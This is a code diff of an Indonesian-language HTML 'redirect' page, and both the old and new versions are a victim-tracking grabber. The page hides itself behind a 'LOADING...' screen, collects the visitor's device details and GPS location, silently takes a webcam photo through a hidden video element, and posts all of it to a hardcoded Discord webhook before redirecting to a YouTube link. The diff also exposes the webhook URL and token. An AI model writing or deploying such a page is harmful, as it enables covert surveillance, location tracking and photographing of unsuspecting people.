@@ -1,164 +1,154 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirect...</title>
-    <style>
-        /* Layar loading hitam */
-        #loadingScreen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: black;
-            color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            z-index: 9999;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Redirect...</title>
+  <style>
+    #loadingScreen {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-color: black; color: white;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 20px; z-index: 9999;
+    }
+  </style>
 </head>
 <body>
 
-    <!-- Layar loading -->
-    <div id="loadingScreen">LOADING...</div>
+<div id="loadingScreen">LOADING...</div>
 
-    <h1>📷 Foto diambil otomatis!</h1>
+<h1>📷 Foto diambil otomatis!</h1>
+<h2>📌 URL Tujuan:</h2>
+<input type="text" id="targetUrl" value="https://youtu.be/dQw4w9WgXcQ?si=7l8JJHtx8fryYK6l" style="width: 100%;"/>
 
-    <h2>📌 URL Tujuan:</h2>
-    <input type="text" id="targetUrl" value="https://youtu.be/dQw4w9WgXcQ?si=7l8JJHtx8fryYK6l" style="width: 100%;">
+<h2>📱 Device Info:</h2>
+<p id="userAgent"></p>
+<p id="platform"></p>
+<p id="language"></p>
+<p id="ram"></p>
+<p id="cpu"></p>
 
-    <h2>📱 Device Info:</h2>
-    <p id="userAgent"></p>
-    <p id="platform"></p>
-    <p id="language"></p>
-    <p id="ram"></p>
-    <p id="cpu"></p>
+<h2>🌍 Lokasi Lengkap:</h2>
+<p id="latitude"></p>
+<p id="longitude"></p>
+<p id="accuracy"></p>
 
-    <h2>🌍 Lokasi Lengkap:</h2>
-    <p id="latitude"></p>
-    <p id="longitude"></p>
-    <p id="accuracy"></p>
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+<script>
+  const webhookUrl = "https://discord.com/api/webhooks/1360533667700543569/wFR45Uxvr1eb30ito1U1d6XtEif37RpsDvFDwtyJmbneTgwn2NPG45YZIWSoRywfBo8o";
 
-    <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1360533667700543569/wFR45Uxvr1eb30ito1U1d6XtEif37RpsDvFDwtyJmbneTgwn2NPG45YZIWSoRywfBo8o";
+  function sendToDiscord(data) {
+    fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: "```" + JSON.stringify(data, null, 2) + "```" })
+    }).catch(err => console.error("Gagal mengirim data ke webhook!", err));
+  }
 
-        function sendToDiscord(data) {
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: "```" + JSON.stringify(data, null, 2) + "```" })
-            }).catch(err => console.error("Gagal mengirim data ke webhook!", err));
-        }
+  function sendImageToDiscord(imageData) {
+    fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: "📷 Foto yang diambil (base64):",
+        embeds: [{
+          image: { url: imageData }
+        }]
+      })
+    });
+  }
 
-        function sendImageToDiscord(imageData) {
-            fetch(webhookUrl, {
-                method: "POST",
-                body: JSON.stringify({ content: "📷 Foto yang diambil", file: imageData }),
-                headers: { "Content-Type": "application/json" }
-            });
-        }
+  function redirect() {
+    const targetUrl = document.getElementById("targetUrl").value;
+    setTimeout(() => { window.location.href = targetUrl; }, 1000);
+  }
 
-        function redirect() {
-            const targetUrl = document.getElementById("targetUrl").value;
-            setTimeout(() => { window.location.href = targetUrl; }, 1000);
-        }
+  function hideLoading() {
+    document.getElementById("loadingScreen").style.display = "none";
+  }
 
-        function hideLoading() {
-            document.getElementById("loadingScreen").style.display = "none";
-        }
+  let deviceInfo = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak diketahui",
+    cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Core" : "Tidak diketahui"
+  };
 
-        let deviceInfo = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak diketahui",
-            cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Core" : "Tidak diketahui"
-        };
+  document.getElementById("userAgent").textContent = "User Agent: " + deviceInfo.userAgent;
+  document.getElementById("platform").textContent = "Platform: " + deviceInfo.platform;
+  document.getElementById("language").textContent = "Bahasa: " + deviceInfo.language;
+  document.getElementById("ram").textContent = "RAM: " + deviceInfo.ram;
+  document.getElementById("cpu").textContent = "CPU: " + deviceInfo.cpu;
 
-        document.getElementById("userAgent").textContent = "User Agent: " + deviceInfo.userAgent;
-        document.getElementById("platform").textContent = "Platform: " + deviceInfo.platform;
-        document.getElementById("language").textContent = "Bahasa: " + deviceInfo.language;
-        document.getElementById("ram").textContent = "RAM: " + deviceInfo.ram;
-        document.getElementById("cpu").textContent = "CPU: " + deviceInfo.cpu;
+  let finalData = { ...deviceInfo };
+  let doneLocation = false;
+  let doneCamera = false;
 
-        let locationLoaded = false;
-        let photoTaken = false;
+  function finishIfDone() {
+    if (doneLocation && doneCamera) {
+      sendToDiscord(finalData);
+      hideLoading();
+      redirect();
+    }
+  }
 
-        function checkAllDone() {
-            if (locationLoaded && photoTaken) {
-                hideLoading();
-                redirect();
-            }
-        }
+  // Lokasi
+  navigator.geolocation.getCurrentPosition(
+    (position) => {
+      finalData.latitude = position.coords.latitude;
+      finalData.longitude = position.coords.longitude;
+      finalData.accuracy = position.coords.accuracy + "m";
 
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                let locationInfo = {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy + "m"
-                };
+      document.getElementById("latitude").textContent = "Latitude: " + finalData.latitude;
+      document.getElementById("longitude").textContent = "Longitude: " + finalData.longitude;
+      document.getElementById("accuracy").textContent = "Akurasi: " + finalData.accuracy;
 
-                document.getElementById("latitude").textContent = "Latitude: " + locationInfo.latitude;
-                document.getElementById("longitude").textContent = "Longitude: " + locationInfo.longitude;
-                document.getElementById("accuracy").textContent = "Akurasi: " + locationInfo.accuracy;
+      doneLocation = true;
+      finishIfDone();
+    },
+    (error) => {
+      document.getElementById("latitude").textContent = "Lokasi tidak tersedia!";
+      finalData.latitude = "Tidak tersedia";
+      finalData.longitude = "Tidak tersedia";
+      finalData.accuracy = "Tidak tersedia";
+      doneLocation = true;
+      finishIfDone();
+    }
+  );
 
-                sendToDiscord({ ...deviceInfo, ...locationInfo });
+  // Kamera
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then((stream) => {
+      const video = document.getElementById("video");
+      video.srcObject = stream;
 
-                locationLoaded = true;
-                checkAllDone();
-            },
-            (error) => {
-                document.getElementById("latitude").textContent = "Lokasi tidak tersedia!";
-                locationLoaded = true;
-                checkAllDone();
-            }
-        );
+      const canvas = document.getElementById("canvas");
+      const context = canvas.getContext("2d");
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
-                const video = document.getElementById("video");
-                video.srcObject = stream;
-                
-                let capturedImages = [];
-                let count = 0;
+      function capture() {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        let imageData = canvas.toDataURL("image/png");
+        sendImageToDiscord(imageData);
+        stream.getTracks().forEach(track => track.stop());
+        doneCamera = true;
+        finishIfDone();
+      }
 
-                function capturePhoto() {
-                    if (count < 3) {  
-                        const canvas = document.getElementById("canvas");
-                        const context = canvas.getContext("2d");
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                        let imageData = canvas.toDataURL("image/png");
-                        capturedImages.push(imageData);
-                        sendImageToDiscord(imageData);
-
-                        count++;
-                        setTimeout(capturePhoto, 1000);
-                    } else {
-                        stream.getTracks().forEach(track => track.stop()); 
-                        photoTaken = true;
-                        checkAllDone();
-                    }
-                }
-
-                setTimeout(capturePhoto, 1000);
-            })
-            .catch((error) => {
-                console.log("Kamera tidak diizinkan.");
-                photoTaken = true;
-                checkAllDone();
-            });
-    </script>
+      setTimeout(capture, 1500);
+    })
+    .catch((err) => {
+      console.warn("Gagal akses kamera:", err);
+      finalData.photo = "Tidak tersedia";
+      doneCamera = true;
+      finishIfDone();
+    });
+</script>
 </body>
 </html>
